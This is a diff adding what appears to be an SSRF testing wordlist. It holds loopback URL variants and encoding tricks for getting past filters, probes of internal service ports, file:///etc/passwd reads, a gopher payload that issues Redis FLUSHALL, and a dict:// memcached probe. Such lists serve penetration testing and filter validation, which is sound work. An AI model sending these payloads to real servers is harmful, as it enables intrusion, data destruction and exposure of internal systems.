@@ -1,0 +1,45 @@
+# === Localhost variants ===
+http://localhost/
+http://localhost:80/
+http://127.0.0.1/
+http://127.0.0.1:80/
+http://0.0.0.0/
+http://[::1]/
+http://[::]/
+
+# === Loopback alternative encodings ===
+# Decimal
+http://2130706433/
+# Octal
+http://0177.0.0.1/
+# Hex
+http://0x7f.0x0.0x0.0x1/
+http://0x7f000001/
+# Mixed
+http://127.1/
+http://127.0.1/
+
+# === IPv6 ===
+http://[0:0:0:0:0:ffff:127.0.0.1]/
+http://[::ffff:7f00:1]/
+
+# === Internal services typowe ===
+http://localhost:22/
+http://localhost:6379/
+http://localhost:3306/
+http://localhost:5432/
+http://localhost:9200/
+http://localhost:8080/
+http://localhost:8500/
+http://localhost:2375/
+
+# === File scheme ===
+file:///etc/passwd
+file://localhost/etc/passwd
+
+# === Gopher (Redis/SMTP exploitation) ===
+gopher://localhost:6379/_FLUSHALL
+gopher://localhost:25/_HELO%20x
+
+# === Dict (info disclosure) ===
+dict://localhost:11211/stats
